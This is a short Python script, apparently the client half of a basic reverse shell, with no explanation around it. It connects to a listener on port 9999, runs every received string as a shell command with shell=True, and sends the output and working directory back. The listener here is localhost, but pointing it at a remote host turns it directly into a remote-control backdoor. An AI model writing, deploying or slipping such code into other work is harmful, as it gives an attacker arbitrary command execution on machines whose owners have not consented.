import socket
import os
import subprocess


s = socket.socket()
host = '127.0.0.1'
port = 9999


s.connect((host, port))

while True :
    data = s.recv(1024)
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        curr = os.getcwd()
        s.send(str.encode(output_str + curr))

        print(output_str)